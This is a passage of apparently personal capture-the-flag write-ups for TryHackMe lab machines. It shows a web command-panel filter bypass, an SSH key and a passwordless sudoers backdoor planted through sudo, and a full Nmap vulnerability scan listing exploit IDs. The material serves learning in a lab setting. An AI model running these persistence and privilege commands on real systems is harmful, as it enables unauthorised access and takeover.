directory! Two new files here:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;/Sup3rS3cretPickl3Ingred.txt&lt;/li&gt;\n&lt;li&gt;/clue.txt&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Viewing /Sup3rS3cretPickl3Ingred.txt revels the first flag.&lt;/p&gt;\n&lt;h2 id=&quot;flag-2&quot;&gt;Flag 2&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-2&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Let’s continue poking around. Before we go back to /portal.php, let’s take a look at /clue.txt.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;/clue.txt&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;/clue.txt&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Look around the file system for the other ingredient.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Well, thank you Captain Obvious.&lt;/p&gt;\n&lt;p&gt;Let’s see what we can do with the “Command Panel”.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;cat Sup3rS3cretPickl3Ingred.txt&lt;/code&gt; reveals that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/cat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/cat&quot;&gt;cat&lt;/a&gt; is disabled.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ls /&lt;/code&gt; reveals that we can list things outside of the webroot.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ls /home&lt;/code&gt; reveals two users: rick and ubuntu (so trying to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; in as R1ckRul3s wouldn’t have worked anyway).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ls -la /home/rick&lt;/code&gt; reveals a &lt;code&gt;second ingredients&lt;/code&gt; file… But no ~/.ssh directory! Damnit.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ls -la /home/ubuntu&lt;/code&gt; &lt;em&gt;does&lt;/em&gt; reveal a ~/.ssh directory, but we can’t actually descend into it.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Alright, so &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/cat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/cat&quot;&gt;cat&lt;/a&gt; is disabled. But can I get at it another way? &lt;code&gt;bash -c &quot;cat Sup3rS3cretPickl3Ingred.txt&quot;&lt;/code&gt; also doesn’t work. Neither does &lt;code&gt;more Sup3rS3cretPickl3Ingred.txt&lt;/code&gt;. But &lt;code&gt;less Sup3rS3cretPickl3Ingred.txt&lt;/code&gt; does work!&lt;/p&gt;\n&lt;p&gt;Let’s get that second flag by executing &lt;code&gt;less &quot;/home/rick/second ingredients&quot;&lt;/code&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;flag-3&quot;&gt;Flag 3&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-3&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Let’s get us some filesystem access. On a lark, I tried the command &lt;code&gt;sudo whoami&lt;/code&gt;… And the answer is root! Jackpot!&lt;/p&gt;\n&lt;p&gt;Though &lt;code&gt;sudo less /etc/sudoers&lt;/code&gt; reveals that www-data has full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; access without a password, so it’s really just as good.&lt;/p&gt;\n&lt;p&gt;And… &lt;code&gt;sudo ls -la /home/ubuntu/.ssh&lt;/code&gt; reveals no private &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; key.&lt;/p&gt;\n&lt;p&gt;Doing &lt;code&gt;less portal.php&lt;/code&gt; reveals that the mystery string is simply hard-coded, and nothing interesting is hidden in the other &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt; files.&lt;/p&gt;\n&lt;p&gt;I’m not sure where the final flag is, but I have enough access now to pop a full root shell. Unfortunately, I can’t seem to start &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;nc&lt;/a&gt; through the “Command Panel”, so we’ll just do this the noisy way.&lt;/p&gt;\n&lt;p&gt;First, on my local system create a new temporary &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; key pair using &lt;code&gt;ssh-keygen -f ~/id_rsa&lt;/code&gt;. Then, enter the following commands in the “Command Panel”:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;echo &quot;$CONTENTS_OF_TEMPORARY_ID_RSA_PUB_KEY&quot; &gt;&gt; /home/ubuntu/.ssh/authorized_keys&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; chown&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ubuntu.ubuntu&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /home/ubuntu/.ssh/authorized_keys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 600&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /home/ubuntu/.ssh/authorized_keys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;echo &quot;ubuntu ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Here &lt;code&gt;$CONTENTS_OF_TEMPORARY_ID_RSA_PUB_KEY&lt;/code&gt; is the contents of &lt;code&gt;~/id_rsa.pub&lt;/code&gt;.)&lt;/p&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The “Command Panel” does a simple string match looking for “cat”, “more”, “tail”, “nano”, “vim”, and “vi”. The last one in particular can be a little problematic… You may have to run ssh-keygen a couple of times to get a key without “vi” as a substring.)&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;We can now access the box directly over &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; as the ubuntu user, and from there elevate to root using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ~/id_rsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -F&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;    -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; IdentityAgent=none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ubuntu@10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Though it turns out that I didn’t have to go this far… The third flag is just in the &lt;code&gt;.bash_history&lt;/code&gt; file of the ubuntu user.&lt;/p&gt;\n&lt;p&gt;Oh well, I still got a root shell (albeit in a totally noisy fashion).&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 3 h 11 min&lt;/p&gt;","rssInclude":true},"journals/2021-11-04":{"slug":"journals/2021-11-04","filePath":"journals/2021-11-04.md","title":"Basic pentesting","links":["spells/SSH","spells/Nmap","spells/gobuster","spells/Hydra","spells/man","spells/enum4linux","spells/Kerberos","spells/sudo"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Basic Pentesting” on TryHackMe\n\n\n\nBackground\nThe description of this CTF is sparse, but the goal seems to be to (1) enumerate the services on a machine, (2) brute force a login over SSH, and (3) elevate privileges (presumably to root, but things are a little vague here).\nFor this attempt, the target machine IP is 10.10.74.250.\nRecon\nWe begin by running a full Nmap scan:\nsudo nmap -vv -oA basic-pentesting -A -sS --script vuln \\\n          -p- 10.10.74.250\nOutput:\n# Nmap 7.92 scan initiated Thu Nov  4 19:56:42 2021 as: nmap -vv -oA basic-pentesting -A -sS --script vuln -p- 10.10.74.250\nIncreasing send delay for 10.10.74.250 from 5 to 10 due to 11 out of 13 dropped probes since last increase.\nIncreasing send delay for 10.10.74.250 from 10 to 20 due to 11 out of 12 dropped probes since last increase.\nNmap scan report for 10.10.74.250\nHost is up, received timestamp-reply ttl 61 (0.17s latency).\nScanned at 2021-11-04 19:56:54 MDT for 1378s\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     REASON         VERSION\n22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.2p2: \n|     \tPACKETSTORM:140070\t7.8\tvulners.com/packetstorm/PACKETSTORM:140070\t*EXPLOIT*\n|     \tEXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t7.8\tvulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t*EXPLOIT*\n|     \tEDB-ID:40888\t7.8\tvulners.com/exploitdb/EDB-ID:40888\t*EXPLOIT*\n|     \tCVE-2016-8858\t7.8\tvulners.com/cve/CVE-2016-8858\n|     \tCVE-2016-6515\t7.8\tvulners.com/cve/CVE-2016-6515\n|     \t1337DAY-ID-26494\t7.8\tvulners.com/zdt/1337DAY-ID-26494\t*EXPLOIT*\n|     \tSSV:92579\t7.5\tvulners.com/seebug/SSV:92579\t*EXPLOIT*\n|     \tCVE-2016-10009\t7.5\tvulners.com/cve/CVE-2016-10009\n|     \t1337DAY-ID-26576\t7.5\tvulners.com/zdt/1337DAY-ID-26576\t*EXPLOIT*\n|     \tSSV:92582\t7.2\tvulners.com/seebug/SSV:92582\t*EXPLOIT*\n|     \tCVE-2016-10012\t7.2\tvulners.com/cve/CVE-2016-10012\n|     \tCVE-2015-8325\t7.2\tvulners.com/cve/CVE-2015-8325\n|     \tSSV:92580\t6.9\tvulners.com/seebug/SSV:92580\t*EXPLOIT*\n|     \tCVE-2016-10010\t6.9\tvulners.com/cve/CVE-2016-10010\n|     \t1337DAY-ID-26577\t6.9\tvulners.com/zdt/1337DAY-ID-26577\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-25017/\t5.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tEXPLOITPACK:98FE96309F9524B8C84C508837551A19\t5.8\tvulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19\t*EXPLOIT*\n|     \tEXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t5.8\tvulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t*EXPLOIT*\n|     \tEDB-ID:46516\t5.8\tvulners.com/exploitdb/EDB-ID:46516\t*EXPLOIT*\n|     \tCVE-2019-6111\t5.8\tvulners.com/cve/CVE-2019-6111\n|     \t1337DAY-ID-32328\t5.8\tvulners.com/zdt/1337DAY-ID-32328\t*EXPLOIT*\n|     \t1337DAY-ID-32009\t5.8\tvulners.com/zdt/1337DAY-ID-32009\t*EXPLOIT*\n|     \tSSV:91041\t5.5\tvulners.com/seebug/SSV:91041\t*EXPLOIT*\n|     \tPACKETSTORM:140019\t5.5\tvulners.com/packetstorm/PACKETSTORM:140019\t*EXPLOIT*\n|     \tPACKETSTORM:136234\t5.5\tvulners.com/packetstorm/PACKETSTORM:136234\t*EXPLOIT*\n|     \tEXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t5.5\tvulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t*EXPLOIT*\n|     \tEXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t5.5\tvulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t*EXPLOIT*\n|     \tEXPLOITPACK:1902C998CBF9154396911926B4C3B330\t5.5\tvulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330\t*EXPLOIT*\n|     \tEDB-ID:40858\t5.5\tvulners.com/exploitdb/EDB-ID:40858\t*EXPLOIT*\n|     \tCVE-2016-3115\t5.5\tvulners.com/cve/CVE-2016-3115\n|     \tSSH_ENUM\t5.0\tvulners.com/canvas/SSH_ENUM\t*EXPLOIT*\n|     \tPACKETSTORM:150621\t5.0\tvulners.com/packetstorm/PACKETSTORM:150621\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t5.0\tvulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t*EXPLOIT*\n|     \tEXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t5.0\tvulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t*EXPLOIT*\n|     \tEXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t5.0\tvulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t*EXPLOIT*\n|     \tEDB-ID:45939\t5.0\tvulners.com/exploitdb/EDB-ID:45939\t*EXPLOIT*\n|     \tCVE-2018-15919\t5.0\tvulners.com/cve/CVE-2018-15919\n|     \tCVE-2018-15473\t5.0\tvulners.com/cve/CVE-2018-15473\n|     \tCVE-2017-15906\t5.0\tvulners.com/cve/CVE-2017-15906\n|     \tCVE-2016-10708\t5.0\tvulners.com/cve/CVE-2016-10708\n|     \t1337DAY-ID-31730\t5.0\tvulners.com/zdt/1337DAY-ID-31730\t*EXPLOIT*\n|     \tEDB-ID:45233\t4.6\tvulners.com/exploitdb/EDB-ID:45233\t*EXPLOIT*\n|     \tEDB-ID:40963\t4.6\tvulners.com/exploitdb/EDB-ID:40963\t*EXPLOIT*\n|     \tEDB-ID:40962\t4.6\tvulners.com/exploitdb/EDB-ID:40962\t*EXPLOIT*\n|     \tCVE-2021-41617\t4.4\tvulners.com/cve/CVE-2021-41617\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t*EXPLOIT*\n|     \tEXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t4.3\tvulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t*EXPLOIT*\n|     \tEXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t4.3\tvulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t*EXPLOIT*\n|     \tCVE-2020-14145\t4.3\tvulners.com/cve/CVE-2020-14145\n|     \tCVE-2016-6210\t4.3\tvulners.com/cve/CVE-2016-6210\n|     \t1337DAY-ID-25440\t4.3\tvulners.com/zdt/1337DAY-ID-25440\t*EXPLOIT*\n|     \t1337DAY-ID-25438\t4.3\tvulners.com/zdt/1337DAY-ID-25438\t*EXPLOIT*\n|     \tCVE-2019-6110\t4.0\tvulners.com/cve/CVE-2019-6110\n|     \tCVE-2019-6109\t4.0\tvulners.com/cve/CVE-2019-6109\n|     \tCVE-2018-20685\t2.6\tvulners.com/cve/CVE-2018-20685\n|     \tSSV:92581\t2.1\tvulners.com/seebug/SSV:92581\t*EXPLOIT*\n|     \tCVE-2016-10011\t2.1\tvulners.com/cve/CVE-2016-10011\n|     \tPACKETSTORM:151227\t0.0\tvulners.com/packetstorm/PACKETSTORM:151227\t*EXPLOIT*\n|     \tPACKETSTORM:140261\t0.0\tvulners.com/packetstorm/PACKETSTORM:140261\t*EXPLOIT*\n|     \tPACKETSTORM:138006\t0.0\tvulners.com/packetstorm/PACKETSTORM:138006\t*EXPLOIT*\n|     \tPACKETSTORM:137942\t0.0\tvulners.com/packetstorm/PACKETSTORM:137942\t*EXPLOIT*\n|     \tEDB-ID:46193\t0.0\tvulners.com/exploitdb/EDB-ID:46193\t*EXPLOIT*\n|     \tEDB-ID:40136\t0.0\tvulners.com/exploitdb/EDB-ID:40136\t*EXPLOIT*\n|     \tEDB-ID:40113\t0.0\tvulners.com/exploitdb/EDB-ID:40113\t*EXPLOIT*\n|     \tEDB-ID:39569\t0.0\tvulners.com/exploitdb/EDB-ID:39569\t*EXPLOIT*\n|     \t1337DAY-ID-30937\t0.0\tvulners.com/zdt/1337DAY-ID-30937\t*EXPLOIT*\n|_    \t1337DAY-ID-10010\t0.0\tvulners.com/zdt/1337DAY-ID-10010\t*EXPLOIT*\n80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))\n|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable\n| http-enum: \n|_  /development/: Potentially interesting directory w/ listing on &#039;apache/2.4.18 (ubuntu)&#039;\n|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#039;t find wp-login.php\n| vulners: \n|   cpe:/a:apache:http_server:2.4.18: \n|     \tCVE-2021-39275\t7.5\tvulners.com/cve/CVE-2021-39275\n|     \tCVE-2021-26691\t7.5\tvulners.com/cve/CVE-2021-26691\n|     \tCVE-2017-7679\t7.5\tvulners.com/cve/CVE-2017-7679\n|     \tCVE-2017-7668\t7.5\tvulners.com/cve/CVE-2017-7668\n|     \tCVE-2017-3169\t7.5\tvulners.com/cve/CVE-2017-3169\n|     \tCVE-2017-3167\t7.5\tvulners.com/cve/CVE-2017-3167\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t7.2\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t7.2\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t*EXPLOIT*\n|     \tEXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t7.2\tvulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t*EXPLOIT*\n|     \tCVE-2019-0211\t7.2\tvulners.com/cve/CVE-2019-0211\n|     \t1337DAY-ID-32502\t7.2\tvulners.com/zdt/1337DAY-ID-32502\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     